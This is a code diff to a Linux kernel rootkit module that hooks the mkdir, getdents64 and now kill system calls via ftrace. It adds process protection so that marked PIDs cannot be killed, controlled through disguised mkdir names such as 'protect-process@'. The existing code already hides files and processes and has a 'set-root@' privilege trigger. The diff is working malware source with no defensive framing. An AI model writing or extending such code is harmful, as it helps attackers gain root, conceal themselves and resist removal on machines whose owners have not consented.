@@ -69,8 +69,14 @@ struct hide_process_list {
     unsigned long pid_proc_ino;
 };
 
+struct protect_process_list {
+    struct list_head list;
+    pid_t pid;
+};
+
 struct hide_file_list *hide_files_head;
 struct hide_process_list *hide_processes_head;
+struct protect_process_list *protect_processes_head;
 
 void init_links(void)
 {
@@ -81,6 +87,10 @@ void init_links(void)
     hide_processes_head = kmalloc(GFP_KERNEL, sizeof(struct hide_process_list));
     hide_processes_head->pid_proc_ino = 0;
     INIT_LIST_HEAD(&hide_processes_head->list);
+
+    protect_processes_head = kmalloc(GFP_KERNEL, sizeof(struct protect_process_list));
+    protect_processes_head->pid= 0;
+    INIT_LIST_HEAD(&protect_processes_head->list);
 }
 
 void add_hide_file(const char * filename)
@@ -190,8 +200,49 @@ int check_hide_process(unsigned long process_proc_ino)
     return NOTINLIST;
 }
 
+void add_protect_process(pid_t pid)
+{
+    struct protect_process_list *temp_process = kmalloc(sizeof(struct protect_process_list), GFP_KERNEL);
+    temp_process->pid = pid;
+    INIT_LIST_HEAD(&temp_process->list);
+    list_add_tail(&temp_process->list, &protect_processes_head->list);
+
+    printk(KERN_INFO "rootkit: Protect process added: %d.\n", pid);
+}
+
+
+void del_protect_process(pid_t pid)
+{
+    struct protect_process_list *cursor, *temp;
+
+    list_for_each_entry_safe(cursor, temp, &protect_processes_head->list, list) {
+        if(pid == cursor->pid)
+        {
+            list_del(&cursor->list);
+            kfree(cursor);
+        }
+    }
+
+    printk(KERN_INFO "rootkit: Protect process deleted: %d.\n", pid);
+
+}
+
+int check_protect_process(pid_t pid)
+{
+    struct protect_process_list *temp;
+    list_for_each_entry(temp, &protect_processes_head->list, list) {
+        if(pid == temp->pid)
+        {
+            return INLIST;
+        }
+    }
+
+    return NOTINLIST;
+}
+
 static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
+static asmlinkage long (*orig_kill)(const struct pt_regs *);
 
 static struct list_head *prev_module;
 typedef unsigned char *byte_pointer;
@@ -237,9 +288,8 @@ asmlinkage int hook_mkdir(const struct pt_regs *regs)
 
     long error = strncpy_from_user(dir_name, pathname, NAME_MAX);
 
-    if (error > 0)
-        printk(KERN_INFO "rootkit: Hook mkdir success.\n");
-       
+    if (error <= 0)
+        return 0;
     
     if(strncmp(dir_name, "set-root@", 9) == 0)
     {
@@ -269,9 +319,18 @@ asmlinkage int hook_mkdir(const struct pt_regs *regs)
     {
         del_hide_process(&dir_name[13]);
     } 
+    else if(strncmp(dir_name, "protect-process@", 16) == 0) 
+    {
+        printk(KERN_DEBUG "rootkit: Protect %s.\n", &dir_name[16]);
+        add_protect_process((pid_t)simple_strtol(&dir_name[16], (char **)(dir_name), 10));
+    }
+    else if(strncmp(dir_name, "unprotect-process@", 18) == 0) 
+    {
+        del_protect_process((pid_t)simple_strtol(&dir_name[18], (char **)(dir_name), 10));
+    } 
     else 
     {
-        orig_mkdir(regs);
+        return orig_mkdir(regs);
     }
 
     return 0;
@@ -288,12 +347,16 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
     int ret = orig_getdents64(regs);
     dirent_ker = kzalloc(ret, GFP_KERNEL);
 
-    if ( (ret <= 0) || (dirent_ker == NULL) )
+    if(ret <= 0)
         return ret;
 
     error = copy_from_user(dirent_ker, dirent, ret);
     if(error)
-        goto done;
+    {
+        printk(KERN_DEBUG "rootkit: Copy failed.\n");
+        kfree(dirent_ker);
+        return ret;
+    }
 
     while (offset < ret)
     {
@@ -319,16 +382,25 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
 
     error = copy_to_user(dirent, dirent_ker, ret);
     if(error)
-        goto done;
+        printk(KERN_DEBUG "rootkit: Copy failed.\n");
 
-done:
     kfree(dirent_ker);
     return ret;
+}
+
+asmlinkage int hook_kill(const struct pt_regs *regs) {
+    pid_t pid = regs->di;
+
+    if (check_protect_process(pid))
+        return 0;
+
+    return orig_kill(regs);
 }
 
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
     HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
+    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
 };
 
 
